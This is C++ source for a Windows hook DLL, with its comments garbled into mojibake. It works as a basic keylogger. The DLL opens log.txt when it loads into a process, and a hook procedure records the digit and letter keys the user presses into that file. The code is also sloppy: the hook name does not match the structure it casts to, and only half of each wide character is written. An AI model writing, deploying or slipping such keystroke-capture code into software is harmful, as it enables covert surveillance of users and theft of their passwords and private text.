
#include <Windows.h>
#include <DbgHelp.h>
#include <tchar.h>

#pragma comment(lib,"DbgHelp.lib")

void Log(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite);

//---------------------------------------DLL�ļ�����-----------------------------------------------------------------------

HANDLE hFile;

BOOL WINAPI DllMain(
	HINSTANCE hinstDLL,  // DLLģ��ʵ��
	DWORD fdwReason,     // ����ԭ��
	LPVOID lpReserved)  // ����
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH: // ���̴���
		hFile = CreateFile(TEXT("log.txt"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		break;
	case DLL_THREAD_ATTACH: // �̴߳���
		break;
	case DLL_THREAD_DETACH: // �߳��˳�
		break;

	case DLL_PROCESS_DETACH: // �����˳�
		CloseHandle(hFile);
		break;
	}
	return TRUE;  // �ɹ�����Dllģ��
}

//------------------------------���������������е��ù��Ӻ���---------------------------------------------------------------

LRESULT CALLBACK CallWndProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0)
	{
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}

	// ��¼
	if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT* kbhs = (KBDLLHOOKSTRUCT *)lParam;
		CHAR MultiByteStr[2] = "";
		if (kbhs->vkCode>0x30 && kbhs->vkCode <= 0x5A)
		{
			MultiByteStr[0] = (char)kbhs->vkCode;
			WCHAR WideCharStr[2] = TEXT("");
			MultiByteToWideChar(CP_ACP, 0, MultiByteStr, 2, WideCharStr, 2);
			Log(WideCharStr, 1);
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ---------------------------------------��¼��Ϣ--------------------------------------------------------------------------

void Log(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
	DWORD lpNumberOfBytesWritten = 0;
	OVERLAPPED overlapped;
	WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL);
	FlushFileBuffers(hFile);
}
